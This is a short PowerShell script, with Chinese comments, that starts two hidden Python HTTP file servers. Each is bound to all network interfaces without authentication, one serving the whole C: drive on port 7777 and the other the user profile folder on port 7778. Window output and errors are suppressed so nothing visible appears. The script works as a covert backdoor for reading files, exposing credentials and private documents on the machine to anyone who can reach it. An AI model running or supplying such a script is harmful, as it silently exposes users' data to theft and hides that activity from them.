# 立即開啟 http server，需要管理員權限允許 python 存取網路
# pythonw 隱藏視窗存取 7777 端口、資料夾位置 C槽
Start-Process pythonw.exe -ArgumentList "-c ""import sys,os;from http.server import HTTPServer,SimpleHTTPRequestHandler;os.chdir('C:/'); sys.stdout=open(os.devnull,'w');sys.stderr=open(os.devnull,'w');server=HTTPServer(('0.0.0.0',7777),SimpleHTTPRequestHandler);server.serve_forever()""" -WorkingDirectory $env:USERPROFILE -WindowStyle Hidden

# pythonw 隱藏視窗存取 7778 端口、資料夾位置 %userprofile%
Start-Process pythonw.exe -ArgumentList "-c ""import sys,os;from http.server import HTTPServer,SimpleHTTPRequestHandler;os.chdir(os.environ['USERPROFILE']); sys.stdout=open(os.devnull,'w');sys.stderr=open(os.devnull,'w');server=HTTPServer(('0.0.0.0',7778),SimpleHTTPRequestHandler);server.serve_forever()""" -WorkingDirectory $env:USERPROFILE -WindowStyle Hidden


